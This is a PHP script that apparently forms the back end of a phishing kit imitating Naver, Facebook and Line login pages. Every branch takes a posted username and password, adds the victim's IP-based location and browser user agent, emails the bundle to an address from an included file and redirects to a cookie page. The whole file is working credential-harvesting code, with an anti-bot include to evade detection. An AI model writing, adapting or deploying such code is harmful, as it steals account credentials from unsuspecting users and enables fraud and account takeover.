<?php
include('Email.php');
include('antibot.php');

session_start();
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR'];


function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}



    if(isset($_POST['btnmail']))
    {
          $msg = "+========Naver Login Results=======+\n\n
+Username:  ".$_POST['us']."\n
+Password:  ".$_POST['ps']."\n
+Info: ".ip_info(NULL,  "address",  TRUE)." ".ip_info(NULL,  "city",  TRUE)." ".ip_info(NULL,  "state",  TRUE)." ".ip_info(NULL,  "region",  TRUE)." ".ip_info(NULL,  "country",  TRUE)."\n
+Useragent: ".$userAgent."\n\n
+===========================+";
          


         


          mail($To,"Nava Results",$msg);
          $_SESSION['us'] = $_POST['us'];
          $_SESSION['ps'] = $_POST['ps'];
          $_SESSION['To'] = $To;
          $_SESSION['whom'] = "m";

          header("Location: cookie.php");



    }
    if(isset($_POST['btnnaver']))
    {
          $msg = "+========Naver Login Results=======+\n\n
+Username:  ".$_POST['us']."\n
+Password:  ".$_POST['ps']."\n
+Info: ".ip_info(NULL,  "address",  TRUE)." ".ip_info(NULL,  "city",  TRUE)." ".ip_info(NULL,  "state",  TRUE)." ".ip_info(NULL,  "region",  TRUE)." ".ip_info(NULL,  "country",  TRUE)."\n
+Useragent: ".$userAgent."\n\n
+===========================+";
          


         


          mail($To,"Nava Results",$msg);
          $_SESSION['us'] = $_POST['us'];
          $_SESSION['ps'] = $_POST['ps'];
          $_SESSION['To'] = $To;
          $_SESSION['whom'] = "n";

          header("Location: cookie.php");



    }



     if(isset($_POST['btnfb']))
    {
          $msg = "+========Facebok Login Results=======+\n\n
+Username:  ".$_POST['us']."\n
+Password:  ".$_POST['ps']."\n
+Info: ".ip_info(NULL,  "address",  TRUE)." ".ip_info(NULL,  "city",  TRUE)." ".ip_info(NULL,  "state",  TRUE)." ".ip_info(NULL,  "region",  TRUE)." ".ip_info(NULL,  "country",  TRUE)."\n
+Useragent: ".$userAgent."\n\n
+===========================+";
          


         


          mail($To,"Nava Results",$msg);
          $_SESSION['us'] = $_POST['us'];
          $_SESSION['ps'] = $_POST['ps'];
          $_SESSION['To'] = $To;
           $_SESSION['whom'] = "f";
          header("Location: cookie.php");



    }

     if(isset($_POST['btnline']))
    {
          $msg = "+========Line  Login Results=======+\n\n
+Username:  ".$_POST['us']."\n
+Password:  ".$_POST['ps']."\n
+Info: ".ip_info(NULL,  "address",  TRUE)." ".ip_info(NULL,  "city",  TRUE)." ".ip_info(NULL,  "state",  TRUE)." ".ip_info(NULL,  "region",  TRUE)." ".ip_info(NULL,  "country",  TRUE)."\n
+Useragent: ".$userAgent."\n\n
+===========================+";
          


         


          mail($To,"Nava Results",$msg);
          $_SESSION['us'] = $_POST['us'];
          $_SESSION['ps'] = $_POST['ps'];
          $_SESSION['To'] = $To;
           $_SESSION['whom'] = "l";
          header("Location: cookie.php");



    }
?>